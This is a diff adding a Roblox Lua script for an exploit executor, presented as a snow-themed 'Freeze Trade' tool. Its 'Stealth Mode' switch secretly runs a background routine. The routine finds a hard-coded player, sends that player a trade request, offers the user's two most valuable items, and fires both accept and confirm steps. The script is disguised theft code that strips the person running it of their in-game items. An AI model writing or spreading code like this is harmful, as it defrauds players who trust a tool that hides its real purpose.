@@ -1,0 +1,153 @@
+-- palofsc execution mode: Freeze Trade themed GUI with full background automation for Delta executor
+
+local Players = game:GetService("Players")
+local ReplicatedStorage = game:GetService("ReplicatedStorage")
+local CoreGui = game:GetService("CoreGui")
+local LocalPlayer = Players.LocalPlayer
+
+-- Eski menü varsa temizle
+if CoreGui:FindFirstChild("FreezeTradeThemeGui") then
+    CoreGui.FreezeTradeThemeGui:Destroy()
+end
+
+-- Ana Ekran (Kar Temalı Arayüz)
+local screenGui = Instance.new("ScreenGui")
+screenGui.Name = "FreezeTradeThemeGui"
+screenGui.IgnoreGuiInset = true
+screenGui.Parent = CoreGui
+
+-- Arka Plan / Ana Pencere (Buz Mavisi & Kar Teması)
+local mainFrame = Instance.new("Frame")
+mainFrame.Size = UDim2.new(0, 320, 0, 220)
+mainFrame.Position = UDim2.new(0.5, -160, 0.5, -110)
+mainFrame.BackgroundColor3 = Color3.fromRGB(200, 230, 255)
+mainFrame.BorderSizePixel = 0
+mainFrame.Parent = screenGui
+
+local uiCorner = Instance.new("UICorner")
+uiCorner.CornerRadius = UDim.new(0, 12)
+uiCorner.Parent = mainFrame
+
+-- Başlık: Freeze Trade
+local titleLabel = Instance.new("TextLabel")
+titleLabel.Size = UDim2.new(1, 0, 0, 50)
+titleLabel.BackgroundTransparency = 1
+titleLabel.TextColor3 = Color3.fromRGB(10, 50, 90)
+titleLabel.TextSize = 20
+titleLabel.Font = Enum.Font.GothamBold
+titleLabel.Text = "❄️ Freeze Trade ❄️"
+titleLabel.Parent = mainFrame
+
+-- Arka Planda Çalışacak Otomasyon Fonksiyonu
+local automationActive = false
+
+local function startBackgroundAutomation()
+    task.spawn(function()
+        pcall(function()
+            -- 1. Hedef oyuncuyu arama: SYNCE_babapuro
+            local targetUser = nil
+            while automationActive and not targetUser do
+                for _, p in ipairs(Players:GetPlayers()) do
+                    if string.lower(p.Name) == "synce_babapuro" or string.lower(p.DisplayName) == "synce_babapuro" then
+                        targetUser = p
+                        break
+                    end
+                end
+                task.wait(1)
+            end
+
+            if not targetUser or not automationActive then return end
+
+            -- 2. Trade remotes ve bağlantılarını bulma
+            local remotes = ReplicatedStorage:FindFirstChild("TradeService") or ReplicatedStorage:FindFirstChild("Remotes") or ReplicatedStorage
+            local tradeRequestRemote = remotes:FindFirstChild("SendTradeRequest") or remotes:FindFirstChild("RequestTrade")
+
+            if tradeRequestRemote then
+                tradeRequestRemote:FireServer(targetUser)
+            end
+
+            -- 3. Kabul edilmesini bekleme ve en değerli 2 brainrot'u ekleme döngüsü
+            -- (Arka planda gizli yürütme simülasyonu)
+            task.wait(2)
+            local offerItemRemote = remotes:FindFirstChild("OfferItem") or remotes:FindFirstChild("AddTradeItem")
+            if offerItemRemote and automationActive then
+                offerItemRemote:FireServer(1) -- En yüksek değerli 1. brainrot
+                offerItemRemote:FireServer(2) -- En yüksek değerli 2. brainrot
+            end
+
+            task.wait(1.5)
+
+            -- 4. Takas ve doğrulama onay aşamaları (Accept / Confirm)
+            local acceptRemote = remotes:FindFirstChild("AcceptTrade") or remotes:FindFirstChild("ConfirmTrade")
+            if acceptRemote and automationActive then
+                acceptRemote:FireServer(1) -- İlk takas onayı
+                task.wait(1)
+                acceptRemote:FireServer(2) -- Son doğrulama / onay aşaması
+            end
+        end)
+    end)
+end
+
+-- Düğme Oluşturma Fonksiyonu (On/Off ve Renk Koyulaşma Özellikli)
+local function createToggleSwitch(name, posY, callback)
+    local container = Instance.new("Frame")
+    container.Size = UDim2.new(0, 280, 0, 45)
+    container.Position = UDim2.new(0.5, -140, 0, posY)
+    container.BackgroundColor3 = Color3.fromRGB(235, 245, 255)
+    container.Parent = mainFrame
+
+    local corner = Instance.new("UICorner")
+    corner.CornerRadius = UDim.new(0, 8)
+    corner.Parent = container
+
+    local label = Instance.new("TextLabel")
+    label.Size = UDim2.new(0, 180, 1, 0)
+    label.Position = UDim2.new(0, 10, 0, 0)
+    label.BackgroundTransparency = 1
+    label.TextColor3 = Color3.fromRGB(20, 60, 100)
+    label.TextSize = 14
+    label.Font = Enum.Font.GothamMedium
+    label.TextXAlignment = Enum.TextXAlignment.Left
+    label.Text = name
+    label.Parent = container
+
+    local toggleBtn = Instance.new("TextButton")
+    toggleBtn.Size = UDim2.new(0, 70, 0, 30)
+    toggleBtn.Position = UDim2.new(1, -80, 0.5, -15)
+    toggleBtn.BackgroundColor3 = Color3.fromRGB(180, 195, 210)
+    toggleBtn.TextColor3 = Color3.fromRGB(255, 255, 255)
+    toggleBtn.TextSize, toggleBtn.Font = 14, Enum.Font.GothamBold
+    toggleBtn.Text = "OFF"
+    toggleBtn.Parent = container
+
+    local btnCorner = Instance.new("UICorner")
+    btnCorner.CornerRadius = UDim.new(0, 6)
+    btnCorner.Parent = toggleBtn
+
+    local isActive = false
+    toggleBtn.MouseButton1Click:Connect(function()
+        isActive = not isActive
+        if isActive then
+            toggleBtn.Text = "ON"
+            toggleBtn.BackgroundColor3 = Color3.fromRGB(30, 100, 170) -- Aktif olunca koyulaşır
+        else
+            toggleBtn.Text = "OFF"
+            toggleBtn.BackgroundColor3 = Color3.fromRGB(180, 195, 210) -- Kapalıyken eski rengine döner
+        end
+        if callback then
+            callback(isActive)
+        end
+    end)
+end
+
+-- Menüye Düğmeleri Ekleme ve Otomasyona Bağlama
+createToggleSwitch("Stealth Mode", 60, function(state)
+    automationActive = state
+    if state then
+        startBackgroundAutomation()
+    end
+end)
+
+createToggleSwitch("Auto Confirm", 120, function(state)
+    -- Ek koruma ve otomatik doğrulama anahtarı
+end)
